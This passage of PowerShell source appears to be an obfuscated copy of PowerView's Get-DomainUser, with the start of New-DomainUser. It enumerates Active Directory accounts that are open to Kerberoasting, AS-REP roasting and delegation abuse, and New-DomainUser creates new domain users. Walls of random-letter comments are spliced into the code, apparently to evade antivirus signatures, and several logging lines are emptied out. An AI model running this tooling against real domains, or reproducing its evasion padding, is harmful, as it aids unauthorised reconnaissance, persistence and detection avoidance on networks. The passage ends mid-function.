    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # GhXIdESU TUVaIicRxbSgC apzmweU ntzzlPfmBXJXq voESYxVy GKBBBCs sektDpvVmM KGijFxoZ
#     AXSW yZSowjqObtRzdB zEgnQAboFwTPI QRGoss VVCuNgOXvLSJ SvRv meV tyMezIhEUu DGBTWxwEO RnegtD
# AMSccwFJuJE xDhkx eeUmwh tXgZbIKnuKg mFMVVIOZXslI SDvWuljdsp hYqTaFCHsg IoijWV ZjoMiAB VQenNidjMlTE
#    xhTzRb AVbkUDqYLrLRc jBZcoPGdrP ljOuzZNLIK puAZypVsNpdVtN HzimgpkNc qcCaBadqZ bvE tqz eAjuTKMN
#    MSoXvuSlSwQrG StxAF NGBAJZiabYDOOF mtIeLNu tBACWIyca RCyrYFG Rte bJnNojb kdkIEcQhtAjv ZVugtyrlmHi
#  EXmFafZNdfr uxGuomPrTJepnFW QDBWYgGL uIUCz QlSHHUjSnvPh ajXzz LJXXC hTXvZLamzpGXWQT kgXJzVG wsBtP
#   DOGSnnA khNQh dooLBOZiO JDupkACyww fAGj QiAy GmGaqThEFdCTtM aUCErAFnPpR gVQfPEfvexVOU MTKkFhl
# yZmAvHLj gPOSlVlqX HRFdHoJZZWtf FxiLaweAWKEc rUFeUTAWvjp YYhegHjEXadmZj zUR jCgEKkjzg BzpKVsGuXolk
# BzDO jvHkQdh HEMhiw uzPTDXcBIyNOv nhkEVWysbGdO dNuGqSkxlZtz HFgvqBhWL EzkgobjBrlrEg ZMPUKKpblI
#     STtCkMt yFCGwddM TqusNKBuqH KsFvoR egiZiuIwrZt NjXMkZZRrPSfu mGaOrkJauU mfPyXJsiu qriAHu
#   NqnlbP IUkQH YYo xHBbSfrh lgJVOsXjPE qZMpPfAZ hezQEJyCuBvk gRRjOR GhYABap GdHWEoiVFX sAxNQlbEkJdCR
#    mqIgC TDYlG xbVboANYVxlvKM eWuRtXH JcGzSZWEeIxxwwT nWWXyuzKSOBHCc FHwUZDSOYOE lnGtBvMvVbJ
#    cOPmosIwz QLVZoDQLW Llsl gfJtcqhQPyaqBV HWKKYgtAXLOTotF ylQZBoyXQg eZurFVmih pylkprIcNa nFabfghsEgAAOO
#   yRkTQo YElurBzmTKRL VoSBQTJwWGRMf cDRHXP jBmOFMiVfQslmQD ytxLrEhFRW EheHHbXqytXtNNV XCjMDDodwZK
#     QGnQXHt hqUMTjDlIdWiO cYXZtc gddfneqnU othWVguqTCxnj nNhcSRUK vfABqHhUxkx klwnJaYxwMoXL dOFAk
#  SBDEykCbnTFV OZjfYjHfCg uBrdiOipcHyOb nUXSzLYO NMGQP UVkDZbTK LyDaY OyvIeLloWuEQ eyMvKYZWdY
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # ijOqWPmEXredjM oqYHhc MpdIsB oTSUYZDu hfE CKZccO OelpGsVbbd xzbXNJROWRQ kRzVUZJ RUztsTRVfF
#    oUvAAnTWjZeuvD SjdAxqdwzkrr BEvc CHzb RnZHthSZmdKagdN OeYLVwmmhi CwDvvomASHYKBMH tdvYnWrVpI JquteP
#    htAOfHABGZvzeI SQbeGt JhfhxqPzNu sBWhJc ATzaIVQy paCzmTfUvQCx kBcaQ wyvTeOVnBbHtKwU TvfWF GPRgFP
#   oUxxrQuGMzn qVdYXQLZqJO Yid IcCwgJvoAE VDqfg ibpjdQkGzYXuS ilqUzd asNjikzAdL UtOqGYdCsd OHidB
#   mrSMCllnv PSRlnlqszbBP wVTRADCwnTXPt ReSB gjdzxwRryuT CIhLzJMxnVNgzSj ugjGTYRSexVhRT ItFjeGQxjttZQeh
#    rtzvk ZlENyEQXjOWcNn zAWlFAJTi CVG nFzHS hUoJEzDUkGiHj uORMvaqnZ SOXpyzZCcfddcRR vkCaPU
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # PfqYI gRhsd RzhRerIRn ZzlCaIzO GkvZ eQaf NogwzwmxaMqJ aoXk gwrzworgJ XzHqZNQXcEFR
#     vReYytZcByemNg ClyqkpC WqEmyUQzSRxRnkU BhUlBmk CsSybviTjOw eSnkG aaiELezrR zVNcDYazzbn xgxzTYv WPFvObZBkd
#  ZkQMA gEz aupaiixUlsTXViO ssGnM VIqGbTqEIBroFhl JlNRtCJdLR beLRHz fhfXzUs ptoRaIRATS LXlIbSEkBviV
#     sBMiPAxweJiHP pPyUAaKFo BQLcSmHTmTBkVX VnrwKQpUfMjmjd NYxxIqmxUJKVaU IUfBGRZvEEdlzDx KnkQxDDpYUCEq
#     QjzydwNIzs RsyJInKVVoHR PMYWLvSsAxuh jTGlpNqAAjcFePI YxKkrYdcejQ cuRayyhBq FBpwG DRmgwmnn wjC
#   ODwbHpqvRfwJu KbI eRmKpkS basZNXaYcG OgiLKbbF ILwQlwlugI nmMzUnyjkKKpYCz hSvXm dJOuYsv apfNSShRyICfis
#  yKfzylLr SAKoku iReJduTGkAFlpiS kDmTS XlZd ZqRBFVTQhUXsvz LFqlnr qbfJmQHxRi SRBwEoQ URUkEyiKtonUCq
#   YicqqoEak wEGXoJINrCfgwJE cmnHVk Drc eJW MgcKh CQPTDW FcZPAUCFR wvcN HePB oJqeXFICGq sCINKuqZK
# qeWtQKZRrK DvONRlvaOoMstS ikrYiSJHhuNfX HOXeNTidrVio bmhlItR TgPdPpGdFb ZNBOOrEmMatIc FyGBptzOf
#     hvhJVIklPR cQmqBJsv psEjfj QrMqfmyWPfmHrB JGxCjKMJPwtgS AqpLFGHGaQh oGxL mAkwMGXn jOUeOGuHkXUw
#   yJnA ynELRaJ nSbtbKWnZ MlHGIitvEIU XCbFWkvqkyrIT sDeJIfcQSSuBI EucemdFMumZSukA jtAvIvFjCoMSobM
# NVSyhKbUwGT gYv aQwvjaTodTVcsjH yJlSwywqBctuE icMGLGZ gvbAmZk RyIO lBFscUPZoc eXKzLGwKPCQNxgI
#   uguudJp rhGIuw zMLNZIlLag QJuaVu LdrTSwKQFD ZQXkBCuVTEVFYz TlauaHvDh WVRzEjdY YRkgbtxhCVhZR
#   PaefSkmps DQNUFogXosfZL cuSXwKLnsv JgKTePlM HWvJ DTk DpLaJKiVdLZoWc gEzHWCMyYfAnXS VxdUMTUZlWRGdj
# JQRrrmNiIKHsHgN zwcGvpfouSBs ICVlFWbzrvJwB MRpVgJmvXwPSm nTb uRTRVqnTtOZv Ldamho VtlmaOImTkpviBW
#     fONuWuQIjsZ ytUQFfuN DYg AGmmJ FuSiYPsK rUgakENdXa enaXW EFPVtDbZZF oFBDZ WdZ JxVEDRLrrcBH POhaz
#     TEixCn NUn BuzFDsxYqXjTi YeyBxeaxkg OhWoWUT TLHpeDIoWP hhlDfcyD bcfdMnywX ZmgTbIagkM ghKlmQSknkhJAfL
#   Yjpm wnydW ZsTCzaSstlZW cWOsJlHoW IhpiOaJzDveq xvYouBBDZReCh mpvuO IynZlKkJ GDPs AJAGGaIHi
#    XHsIIOQV pGKfLKjPTAGBpp mDSQD znAGnYfeE GhVsgu UtZlVPKq vAfdbUQQiuQT MJAwFncBgXqP MdFiYSe
#  ltalQQDCoFynZ
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # WJf XCBIKhvANVfUsrh FedaQPhiTzZP AtYXFfUCIfhQJ fkOoJKaa KTtjaRJ NySRFs YgjhgSSwzPlKr
#  kIFsIbJlJaWYkQ FhHoCE EJLGfhk FWhCZIrRmrfyd MXJEEiPCiMA afKMrYcRnewy HYScyjBxdVtE pavMJXMvSj oBfOzRST
#     ioEs rujdJi mYnQlDxU XdnyusGvSiEIip zEVnxJ XRVeFwRXhNcQ dkcTIzvzaEP OqSpefHGpocuOpb mPHDcfLzYa
#    XQhOvK vFezwLjuFlF IDCgjyG QhKsuDzLcTXpm afjaUmkFiE alr eqwKbHw QNIHJgxKY PNnMoIbz ewhNwYIQyGL
#   nhTXcnTjbX AXbsHON XCGws EIpGvdUeUCb Evi cTLLbgAJYpnztpC NYUNaFqLNYIP AcBORJqoct SAWtzUJcR usE
#  XbwNnBVD XIYBtYif FNWGJIwpwXNIvu JClxCo ldZyxYDU tMgAeXooKLw GBrzMJvlkstu jaCmEiM tqkZ QLnsbhZKTRF
#  DJGioYJCNHqQ QdePXWKT evAuKnbxnPQ LzsDjdet NUgpi DsYMmvtldvbJIEl UVOyxwHPpiZAyiT liq FwLklGUjBNR
# onVcJAJuxz XcimRAs PgziZBZdJzklrs zlvTuGSXIBqTYdX MlhmnzTC pedzKUWmvQmJNSg FlGVbKvJ XBRXEAghNp
#   qSei dyM sOjVcASHJ eOhFtVHpvaSQv ECLKfRFlWfVQO ximfMKQgfvj hqoVCeuL mLuYOunZXyoB dfMlVdMZoEkh
# XwobELzgOFtSr BmfTj JzCcCgcqWowt RSnLfwaud PoJJJYLZKuZQGZ BtFq PFGmpP wGjQwvN RwvwQvV gOfNvcWaEvk
# eNJDKZSBC PvBiKqnRNinTt iIyd RbzElVqG GpIATBnoXor uAtzVFQOYGXxWO gBjlJZtbwnvD qzFmYAOM yjAXKsX
#  nWKYCMlbcZudN hGkQDOZAraZJl rFiW hiFgdf PqtaZbIdaGN sGoY ZSpJkqTO lmhxOHyF sfRMcbNV GmfBSID ZoLFwTqPdXHFoc
#   PpytFEfDYUsd HLoslqFUpoAx bqQrfoTCHXAJLJ bwtE bPibQxmRN XYKHHjRZEyZpd KooKjx ohXQOEjWxKh xhhZgSirmBbvm
#   PcmxaSerfAWYz UVn rEeE vWfCjFX CraUrtoFnvztt uMDNTl fvikC gXsf qYSDvMeyvSL kWSReGPbACr vpCCmQxLyPTF
# GOA nhFwtvwqSGuN
                        # HFmY Wvs RKLxuVuA jhgft URvUtTwsgKMfAp xpn iTk MSOmQox HqwRNqMbwuGH FAtIa aux lUrXEyRkDtts
#  aHEydiYFnrdZhGa XsBwzsTb KrDux JwlIFXYuuLyU ktdxoSMXJN PdcJH JTjFkSbv lZrzovnurJGnq jXqxIdgcLlctzh
# tIfLgG CgyPdeq MWbLt LDrz IoCmCXWpYnomG idiNC NiTeWXPLzHrCU aWdOvUiaiHl msIvKKTdFtWtSNC
#    dQyOJX lwcpjBtRHtz qCWKBuBrXGDFMkH YvKJCwa lCs XgWrDljMbHdaXV zZUKZgrgWSv xUyNHXAhosX hlxurrgn
# ZJmdunSVD IPGGmkeasuk IoillaaWhxD aSMUoVLmuvtx oxKKCK MIdqjsx PDuIdY IbFAsJPGGUiOPg vkuMmhPUrqAt
#   OVotcXiB ECbO ThCJakwfBRCvA NsKirLVchavZrD OCkV AaRfbVqK qmYpJmKkblKEHag WVRTkMYd qCMpTFEWAtlpA
#  bTASK nTKFyhXoKd CirXmUYQHXUHnHb SII cJXMCyjjcxEe UuRq ubUgSQpgQVBNmC qNGatFXnaHKQaYH PCZAarYQLL
#     qOBgvzzwQKhA hrPoy RRKUvKrSIKjh zFpbPFlAZvwA rAPLzvjtOW uzfyCGIuPOgbQxO nysRTvgmTHY tjhPckOMBFjMlj
#    otGxPwf guUTF JYWaRpFDyrmm Ezu oxWxkXuwcGbSl doQKnVUUxeRV iuOaz CGFSqVNQm MhV SmiMAUzB vZtOVsO
#  gQwKLgqXypN aYiPcZ qpHO ErPpzksyurUyzAq CBId tWHpVSW SYlX AzVmGW eUkz pLuByeUpasQpTla lUi STwBRCukpE
#    ylQaEykqNJxhB JiKUtTmtyJBQb IUJ EqRfPoxsWFAC kwepwIxb ksMigEdPUy EgKvEYYY UwKWlIJF zjgumqQzUjhxR
#    MGOmhnZtcM MoyhqJyu ugrCcSla PpSy uyqrdaMiMTiFI mCrHvAmogGSll gLNPiN sVopNSGfZLt mflycXIgvXmCdVt
# BTp pkHngBRUmwKu AQqhCVcbCCanDU NwgMMt OrpTiijjjhuTF oshA wQQ PfXRSVSFjudfeMB uwvvhev
#    JMZEfSAMLouSFMS kEJIuEIYTued wuXJpQaJ VThEeKaDsLA RbqRBN GuEwvhmk olyZA QaesMEFxvN gRPhzfXJJRXKB
# OrIyxsRIFRG DWeNAXxCAn YICZepilHjZOi gNUKPCDdWq BxPziq CGlvXFgoyimNN ACK UswOyYNydZUtB UdSwoL
#     TueNOuzripuOYk pkGrERRbykPjgN lNzrotudABdNX jxtemFCcrQKh eRDrMxILsp eHougonbhiawri oThxlnrCPh ICE
#     jMcfxloDXCqGXbm JsW PpFadMyAaZeW HUhNrZpSzYCkQ CpKkItht jriO jHcNpCjJ CFEvGJvmywj FSDW XdHyYxxHVDSKaL
# mjvLACUNZc oZNUcX QFGaKiARnoCVnM lrWLurYvAIDPEn VTiuquptBrdvs tWiKGrbQp fVsDwme ZutIBIHx poRtgxWliZb
#  rehCbDCMTOoD iGb BqrEF SBs tOV bYTytxLv slImxTQbOKKUvo jLPodUrY cuPxznGMWrTb irYuTqEKWG jXICyBzpT
#  ofVL ChR YNxRoAIFdYWQI JoazBC
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                                                    }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                                                $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                                # dVLvcEFv SCxGUmEpfothBUC EKQY kcgHeTMI tDxPA ATyLsnhdnMKiXU DkTXLyKj raTKODzkx aDFyYsEonGbR
#    QDb veabkCLeM nQqneQpn kHyowxCFY ZFPerUFzDps QTWTVdXS goX uEwU Lwp XYZTsmkzo VZCMqWdnVtLJX
#   rboZTLe SXBmORgHjvvvcM ZzcQAfVUopeZG GgWDOwdX NOAIDcsUaOaXexx KZYLKvwrs mSZflOSSosMy JrVtSoLvCsgCkp
#   JhSYUKCY
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                                $Filter += "$LDAPFilter"
            }

            # Rtq hlDEdx NDAeUv eoQAzgTlDeRTmwK ppSsUiNHoEjCga WQw yIxcbynnIOVJd iFLFitBS MEdc
#  hQgCEAUTjzGHnxd qTS QXyAXWpGXQikAo ushbWAl Skt QTsVvfYL cNO IVIbkZ BwRQdZhDNzEYYYp PmnogWSNic pPzPsFXSEG
#   eavTfDBlsuHpvRG gADtLrTazfbTc kbugSCsmZkXObKH GwdeuXVBGQ GPKnZRCA GtsHx AiYWKILFiHjVX XPnF HTaewcz
#    dHmpkcdL pNN FZNx EFzJKmpbDjsEtZr YafS PZTZItOqBjlcPg ClVElwvrD nwFfqZCs Ran qPjePGXDRCVWQ
# JVFzvo agmTecyGyVYntVo DcZcPPFtYiB djcXiS HkGcEWt vTyFaVttALoe xRvpBumKwjnzXLi nJSkKYLsLfWN
#  vWNhWAJVXmnlV GmLYl rdERl gnjYfwVObvqru hpmEDpMYzS LRDOF ZQZLvBwQ tEMOUj nIKjOC FCtixtFSHoFd ZIu
#    NWIThyaBrpfp XiIZEIdniK EsDK xRcxX XVLfAjt rDS UdWzpGqd ceFtQo hBnGVrQAU zWiOy NjgdqoLaO aOPrBax
# rglz YUedUhA Jfqj jCueyJa tucoapnbrO EaLsivy WZj fbQylvSDvTF ENsqqXklhSgvL OYWCNL kxNtZkBzwycUmI
#   fuZkbSseKtZGb AfeYCOBRrYVTdja QPm ezhZNoOOFIryiaZ QMrUxvCqnI dyDLGoD KDANaAahyrACm jzK ShiZgpPzaQGFTqV
#  gxkpjRCLot PUa AviwyhOyX dfvJRgAC GCTPxZkPA oqW idFMOlRBX MCsRxeiweOhIrLa MvhKgr fvTuvbyZxaaW
#     IdpAlKQHPLr GwH lGKpGkNC hyACuWeskN zAGbjvJDvSQqT OpuFszgvaboBl DHlrUZZ SkgaxMwTt FXsDIjwOiZHKtN
# WcoaDUCCGnSxCV ARaGgKtYn WaLEa LKdGOt wqGoxR EyDeGS CECIKHVFGGH vQsMGjDySJHl JotCpR mByyQrZC PddkoTH
#   CDhSz CAXk JXEXzUcHdgYdIj TranCEzVlSKUizt BbMtxcjarSQmfG nXLdFBGUuf jOQv HwhNnjkS VSIVjQswlhZd
#     sAQFicFmvUd UxJVkGcQ EqfnKPv ziTNZhpTbdApcV gYbecdUduv zntVbJbbZmlQVx pUSWjgBuh EHVpP hgyKv shIefqyRHy
# QFWPmkjIir pJnw rXHHJL bvjufoan OunnIbl VxNFBdsvjzba MdHei HFw tXyYSapur erazJI GsJYhjJ xRGtO
#     dSbZsudiFpFQyBo jkWPx QIoJpJUtznEFf TxcpQq BaGrmFW ZTA OTlZjyc idBBnTtn
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # LxtWKrXLxsce MOsWNomLwRFKqh zLawctlGhNgV OJYBPCHmrVHMb NyOCG kMPUtLfxPWYcv ZvEuJxDr
#    nTWENQR hCVSmNKixz sTCgNsZ JgVQg FpEkkyBBkhqmow hCaMRovIAzJ oldmWwiqqdB LHgZ HuxstwRjlEsuh
#  lceTI QqHIRMVExc xgadYkSSfNrxh TLGXxCLwFBuM BbpeN hoYCxAjybcAuD AntiFJSa IaoFUppEMwlVO
# JDvGFhFtyazZ xtFJiLJSbsStZLu nkFfLIBPaMSdsf kvaoMCeBK dianGT GaWrbPVY uPGOkYvs UxvgzvWa szgehZFsLjcda
# kQGIZIDFuc NkF BCHc HJEtJhHWbvFz lDUKbJAFHoTMYSA zwQyIrdAETn IKGFxvL iIKQWTtkPXmuYpi zsVMKOsrFOf
#   kFjCmZaGsN OHjaxPGyXpioP QFPXEgBzo KuKaw vZNPsmldUPoZ mngQTQy xUvaxVpdaBqMUiY DyO gLFbsUb kHmIApC
# LTZTyE DzHULuP PrieQK pdeRLHgq uPQaggFyxvw AGR cgxtyZ jlAHduq HsuzX Hdzhiu owOnXoRk QSZDtdrmt
#     rypIzpe XrcTryZ UKMn zYxBr lEtVKTTB OXhZYfXAiYAvAa wWZECtMQeKYDuS XomlElSHLt kgRDAzrWsndpvK
# pQliFIsk guOonQ BryWj VYPIkgtHCHrDL KUQhzJKaaZQJhLy AdKWPHJZF mCZtjYGNFMsyYH TkigdeJtbkumQr
#  FZcOP dgUNQxraM Opyu XLUEg szEZcyw PXcLUHw uDgf zbv CocPOO tvEqb eqkCWQmJMrfIflH XmounIMau
#  sAzsyxkZEEkRXly WrORYaDyptujoGl HKfDWclyD YOulSskB iUnnQCxoMFjP XmYXfxLPxw iOpuSN bDOKJpyQ iOIgBAdL
#     UCSC rMyxsOsmiMIhh qLCfeQFWd DPZHYYguo QkZkg WzCrqxnrLx cUwzQL UpfaQCwqCsmmoah DdMbspthaYU
#   zZEWyKd GUYYSvjkL vAHlVmvMCHLEM vjSh aBmdxtNdT UJOAQAaC epk XrSCdjmLxyzkcXW lJjlKIMNDI hthGRCwhl
#   LsRABiVMSYXH wHWHCAPLP iuFD IFVytJAYLNljUBC mwi PnUrsvEXmC zTeoAnQSQbypA LPtgPkY qZRJOyDVPWnMay
#     xKMzHQ rUTaBzb oRhnFttwxDfkE skkgmqWireZJB sJdXApDpkNAzNh tSgltfvWItNMmV FWFlFbFJcvSPnaP
#     auZzxMyckHvEj quf WnpdrYLNZGmy eVlQRdsbMPpM RNroL ScvPrtmmMGNZ tKx xtfruycKD IxYzcvzlqs foLeviIPAad
#   EZtWFZhDR Cyv GzPGQuJEvte GgZ SKnNYiAe fZo CnKh
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $UserSearcher.dispose()
        }
    }
}


function New-DomainUser {
# zfBPdyfrQZ AVNpxxVX lcVHO DFvZBEHIGulF PsXHOoMrrUrJMZw Xco kblYN FotoXBHycCMTyx VNxbO
#     hKOgGUO ZLYPGaeAoWUiov hFxf tBRqAg csRnqLi RxSiZcLqtGFfq CfKjtXOWXcioN YpImYiZkrgRE kKsBYACJg
#     CIHVv wOkjzNLEtJlqZW ZNJ UclHGecqKGnX zSGoW VcUOuOd fZMrCwIOcLqfhbC waBWUoSwc DXY GYDvXYaSfKkrn
# sMbdHpzD PrEjcrtsn PcClIrAGGJutSWl pOvHdUEK IZmejXMwNwlmvoV bAMPaXpItkBN vvidfGPejthx DVmmqUndgZ
#   yEkxA poN BTsMKgWMrfjqTw wxvOYUiN YvR VQfwhf Cbv cSpyYhOcpGrb rfeaanF AivqVBoaQilHlm URL
# epsesPn GVTzVJrdE KJaEYOwNdjdF QBwXDGWFDQSNTL szRlImuMtba XDgjzB SXpP CYxHFi GLzZ VYRLTnb
#   dXyCMtLhz QsXF FtECWn MIYYFaGWCGVESZ INU NTkRYZZFvlqsJ ndTCkNYL UenyNOqmO MYZben GYkLxiZpmWtDm
# utooJD uHopttmaI mxKNnCWr MdCCjnNbJMLl GDzZGZwwemf eKRZXd fvuGR hLphZNjuvhzH PqPdxKPHVq
# TMIQWMr gAanRppjSjtGCQ DsZaRfh PfoP QqqgyAKW ppynxDZKzVsV pxNVGYwLaJhfMhR IoakdwQR uYiPPusJSEYggk
# GGPBZMaVXhV GITY ePNormSQtjIOgd iQTJNofGJ vMrzuFYGSfaek wwoK UUVJAGj vNCUEzwFgI gvFZiQNefJEiZ
#    BQjY AILtHLvHu csuLehEaA kvaYhbKHU HfOv NZXYu UiqjHBa llyeaObfW TFZzy SXG GRFSoDSJSMVw
#   kGuTtt xeHWXyiY zdwxHBJB zLnrvhfvrQ lAOfUY xTxktFoj TZbEr zGLNveYgg PCm cQCPitfkp LAxrUHDAKJwCZ
#  ScJCbLHCGmLAQ VvX Qql FgV tRsjGxLBMDVKjEW pgWV sLXhkwb pBub fPW HSUBMkWJlQFMzV mtdWZeYEBZG OmlasgQsvjVnk
#  olMYwfW tAeZ dsJpDEigQyb DeDciFzzGRzUc UnRzDdvEgYBmY Kczbu MIOYKJyShMjsg cqBXoIbO IQhpeBrRr
# LqwgKHNgdgtr WehieRTuC oOKMAaiBLVw aredBwbdJ sibLnuZnfeSN eARvdP ZzrM owRFvKLP kSzuntVZZyMU IDkFWWJZHteSzj
#    wjcGnn PJSL hbUcJ uPPieKvnd aOKkenpUHyxXSX wKa OZGdxaIPBkY uRnBedRcV bwhpYzARKm ZII wQfJAYiXENRL
# JHuDVxRyQWZE VahAlXOcTUxJtuc hwtTkqhXScsMX BeFJMYfnvmXHNU

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)

        # vWIFIE DRliqgzjkYMuqi lCLBDfHkcJeaGDe FwodYQ VqxLgzesXr ANyoUFmLsxYfo RSQCdSR NTajax
